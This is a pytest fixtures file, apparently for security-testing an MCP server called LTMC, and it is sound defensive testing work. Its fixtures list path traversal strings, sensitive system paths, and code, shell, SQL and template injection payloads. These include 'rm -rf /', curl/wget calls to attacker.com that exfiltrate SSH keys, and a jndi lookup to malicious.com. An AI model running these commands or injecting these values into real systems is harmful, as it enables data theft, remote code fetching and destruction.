"""
Test Configuration: Security Test Fixtures and Utilities

Provides reusable test fixtures for security testing across all Phase 1 tests.
Includes multi-project scenarios, attack vectors, and performance test data.
"""

import pytest
import tempfile
import shutil
from pathlib import Path
from typing import Dict, List, Any
import uuid
import json
import subprocess
import time
import requests


@pytest.fixture(scope="session")
def temp_project_root():
    """
    Session-scoped temporary directory for all security tests.
    
    Creates isolated test environment that persists across test methods
    within the same test session.
    """
    temp_dir = tempfile.mkdtemp(prefix="ltmc_security_tests_")
    yield Path(temp_dir)
    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def multi_project_config():
    """
    Multi-project configuration for testing project isolation.
    
    Provides realistic project configurations that cover various
    security scenarios and permission levels.
    """
    return {
        "project_alpha": {
            "name": "Alpha Project - High Security",
            "allowed_paths": [
                "data/alpha",
                "temp/alpha_processing",
                "cache/alpha_results"
            ],
            "database_prefix": "alpha_db",
            "redis_namespace": "ltmc:alpha",
            "neo4j_label": "ProjectAlpha",
            "security_level": "high",
            "max_file_size": 10 * 1024 * 1024,  # 10MB
            "allowed_operations": ["read", "write"],
            "storage_quota_mb": 100
        },
        "project_beta": {
            "name": "Beta Project - Medium Security",
            "allowed_paths": [
                "data/beta",
                "uploads/beta",
                "temp/beta_work",
                "shared/beta_public"
            ],
            "database_prefix": "beta_db",
            "redis_namespace": "ltmc:beta",
            "neo4j_label": "ProjectBeta", 
            "security_level": "medium",
            "max_file_size": 50 * 1024 * 1024,  # 50MB
            "allowed_operations": ["read", "write", "execute"],
            "storage_quota_mb": 500
        },
        "project_gamma": {
            "name": "Gamma Project - Restricted",
            "allowed_paths": [
                "data/gamma/public",
                "temp/gamma_safe"
            ],
            "database_prefix": "gamma_db",
            "redis_namespace": "ltmc:gamma",
            "neo4j_label": "ProjectGamma",
            "security_level": "restricted", 
            "max_file_size": 1 * 1024 * 1024,  # 1MB
            "allowed_operations": ["read"],  # Read-only
            "storage_quota_mb": 10
        }
    }


@pytest.fixture
def path_traversal_attack_vectors():
    """
    Comprehensive collection of path traversal attack patterns.
    
    Covers various encoding methods, OS differences, and bypass techniques
    that security components must defend against.
    """
    return {
        "basic_traversal": [
            "../../../etc/passwd",
            "../../sensitive/data.txt",
            "../../../root/.ssh/id_rsa",
            "../../../../usr/bin/sh"
        ],
        "url_encoded": [
            "data/%2e%2e/%2e%2e/etc/passwd",
            "temp/%2e%2e%2f%2e%2e%2froot%2f.bashrc",
            "uploads/%252e%252e/%252e%252e/etc/shadow"  # Double encoded
        ],
        "unicode_variants": [
            "data/\u002e\u002e/\u002e\u002e/etc/passwd",
            "temp/\uff0e\uff0e/\uff0e\uff0e/system/file",
            "cache/\u2024\u2024/\u2024\u2024/secret.txt"  # Bullet chars
        ],
        "null_byte_injection": [
            "safe_file.txt\x00../../../etc/passwd",
            "document.pdf\x00../../sensitive/data",
            "image.jpg\x00../../../../root/.ssh/"
        ],
        "mixed_separators": [
            "data/../..\\../etc/passwd",
            "temp\\..\\../../../system/file",
            "uploads/..\\..\\../root/secret"
        ],
        "long_traversal": [
            "../" * 50 + "etc/passwd",
            "data/" + "../" * 100 + "system/file",
            "temp/" + "A" * 1000 + "/../../../etc/shadow"
        ]
    }


@pytest.fixture
def code_injection_attack_vectors():
    """
    Code injection patterns that path security must detect and block.
    
    Covers Python, shell, SQL, and template injection attacks.
    """
    return {
        "python_injection": [
            "__import__('os').system('rm -rf /')",
            "eval('malicious_code()')",
            "exec('import subprocess; subprocess.run([\"rm\", \"-rf\", \"/\"])')",
            "compile('evil_code', '<string>', 'exec')",
            "globals()['__builtins__']['eval']('bad_code')"
        ],
        "shell_injection": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget attacker.com/payload",
            "`cat /etc/shadow`",
            "$(curl attacker.com/steal?data=`cat ~/.ssh/id_rsa`)",
            "|| rm -rf /home/user/important"
        ],
        "sql_injection": [
            "'; DROP TABLE users; --",
            "' UNION SELECT password FROM admin_users --",
            "'; INSERT INTO admin_users (username, password) VALUES ('hacker', 'password'); --",
            "' OR '1'='1' --",
            "'; EXEC xp_cmdshell('format c:'); --"
        ],
        "template_injection": [
            "{{7*7}}",
            "{{config}}",
            "{{request.environ}}",
            "${jndi:ldap://malicious.com/exploit}",
            "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit()}}"
        ],
        "file_operation_injection": [
            "file.txt; cat /etc/passwd > stolen.txt",
            "document.pdf && curl attacker.com/exfiltrate?data=$(cat secrets.txt)",
            "image.jpg || touch /tmp/compromised",
            "data.csv; python -c \"import os; os.system('malicious_command')\""
        ]
    }


@pytest.fixture
def system_sensitive_paths():
    """
    System paths that must be blocked by security validation.
    
    Covers Unix/Linux system directories and files that contain
    sensitive information or provide system access.
    """
    return {
        "authentication": [
            "/etc/passwd",
            "/etc/shadow", 
            "/etc/group",
            "/etc/gshadow",
            "/root/.ssh/id_rsa",
            "/root/.ssh/known_hosts",
            "/home/user/.ssh/authorized_keys"
        ],
        "system_config": [
            "/etc/hosts",
            "/etc/hostname",
            "/etc/resolv.conf",
            "/etc/sudoers",
            "/etc/crontab",
            "/boot/grub/grub.cfg",
            "/etc/fstab"
        ],
        "proc_sys": [
            "/proc/self/environ",
            "/proc/self/cmdline", 
            "/proc/version",
            "/proc/meminfo",
            "/sys/class/dmi/id/product_uuid",
            "/dev/kmsg"
        ],
        "logs": [
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/messages",
            "/var/log/kern.log",
            "/root/.bash_history",
            "/home/user/.bash_history"
        ],
        "application_sensitive": [
            "/var/lib/ltmc/config/secrets.env",
            "/opt/ltmc/private_keys/",
            "/tmp/ltmc_admin_session",
            "/var/tmp/root_access_token",
            "/usr/local/ltmc/database/master.key"
        ]
    }


@pytest.fixture
def performance_test_data():
    """
    Test data for performance benchmarking.
    
    Provides various data sizes and complexity levels to test
    performance under different conditions.
    """
    return {
        "small_files": [
            {"name": f"small_test_{i}.txt", "size": 1024, "content": "A" * 1024}  # 1KB
            for i in range(100)
        ],
        "medium_files": [
            {"name": f"medium_test_{i}.json", "size": 10240, "content": json.dumps({"data": "B" * 1000})}  # ~10KB
            for i in range(50)
        ],
        "large_files": [
            {"name": f"large_test_{i}.bin", "size": 102400, "content": "C" * 102400}  # 100KB
            for i in range(10)
        ],
        "path_variations": [
            f"data/user_{i}/documents/file_{j}.txt"
            for i in range(20) for j in range(50)  # 1000 paths
        ],
        "project_variations": [
            f"project_{i}" for i in range(50)  # 50 projects
        ]
    }


@pytest.fixture(scope="session")
def ltmc_test_server():
    """
    Session-scoped LTMC server for integration testing.
    
    Starts the actual LTMC server once per test session and provides
    it to all tests that need real system integration.
    
    PHASE 0 REQUIREMENT: Verifies system startup before any testing.
    """
    # Kill any existing processes
    try:
        subprocess.run(["pkill", "-f", "ltmc_mcp_server_http.py"], check=False)
        time.sleep(3)
    except Exception:
        pass
    
    # Start server
    process = subprocess.Popen(
        ["python", "ltmc_mcp_server_http.py"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd="/home/feanor/Projects/lmtc",
        preexec_fn=lambda: None  # Prevent signal propagation
    )
    
    # Wait for server to start (Phase 0 validation)
    server_ready = False
    for attempt in range(30):
        try:
            response = requests.get("http://localhost:5050/health", timeout=1)
            if response.status_code == 200:
                server_ready = True
                break
        except requests.RequestException:
            time.sleep(1)
            continue
    
    if not server_ready:
        stdout, stderr = process.communicate(timeout=5)
        process.kill()
        pytest.skip(
            f"LTMC server failed to start - skipping integration tests.\n"
            f"STDOUT: {stdout.decode()}\nSTDERR: {stderr.decode()}"
        )
    
    yield {
        "process": process,
        "base_url": "http://localhost:5050",
        "health_url": "http://localhost:5050/health",
        "jsonrpc_url": "http://localhost:5050/jsonrpc"
    }
    
    # Cleanup
    try:
        process.terminate()
        process.wait(timeout=10)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait()


@pytest.fixture
def secure_test_environment(temp_project_root, multi_project_config):
    """
    Complete secure test environment setup.
    
    Creates directory structure, project configurations, and test data
    for comprehensive security testing.
    """
    # Create project directories
    for project_id, config in multi_project_config.items():
        for allowed_path in config["allowed_paths"]:
            full_path = temp_project_root / allowed_path
            full_path.mkdir(parents=True, exist_ok=True)
            
            # Create some test files
            test_file = full_path / "test_data.txt"
            test_file.write_text(f"Test data for {project_id}")
    
    # Create some restricted directories that should be blocked
    restricted_dirs = [
        "system/sensitive",
        "admin/config", 
        "root/private",
        "other_project/data"
    ]
    
    for restricted_dir in restricted_dirs:
        full_path = temp_project_root / restricted_dir
        full_path.mkdir(parents=True, exist_ok=True)
        
        # Create sensitive files that should be blocked
        sensitive_file = full_path / "sensitive_data.txt"
        sensitive_file.write_text("This should not be accessible")
    
    return {
        "root_dir": temp_project_root,
        "projects": multi_project_config,
        "test_files": [
            "data/alpha/test_data.txt",
            "data/beta/test_data.txt",
            "data/gamma/public/test_data.txt"
        ],
        "restricted_files": [
            "system/sensitive/sensitive_data.txt",
            "admin/config/sensitive_data.txt", 
            "root/private/sensitive_data.txt",
            "other_project/data/sensitive_data.txt"
        ]
    }


def make_test_mcp_request(tool_name: str, arguments: Dict[str, Any], server_info: Dict[str, Any]) -> Dict[str, Any]:
    """
    Helper function to make MCP tool requests during testing.
    
    Provides consistent error handling and response validation
    for integration tests.
    """
    payload = {
        "jsonrpc": "2.0",
        "method": "tools/call",
        "params": {
            "name": tool_name,
            "arguments": arguments
        },
        "id": str(uuid.uuid4())
    }
    
    try:
        response = requests.post(
            server_info["jsonrpc_url"],
            json=payload,
            timeout=30
        )
        
        if response.status_code != 200:
            return {
                "success": False,
                "error": f"HTTP {response.status_code}: {response.text}",
                "response_time_ms": 0
            }
        
        result = response.json()
        
        return {
            "success": result.get("error") is None,
            "result": result.get("result"),
            "error": result.get("error"),
            "response_time_ms": response.elapsed.total_seconds() * 1000
        }
        
    except requests.RequestException as e:
        return {
            "success": False,
            "error": f"Request failed: {str(e)}",
            "response_time_ms": 0
        }


@pytest.fixture
def mcp_request_helper(ltmc_test_server):
    """
    Helper fixture for making MCP requests in tests.
    
    Provides a simple interface for integration tests to interact
    with the LTMC server.
    """
    def make_request(tool_name: str, arguments: Dict[str, Any]) -> Dict[str, Any]:
        return make_test_mcp_request(tool_name, arguments, ltmc_test_server)
    
    return make_request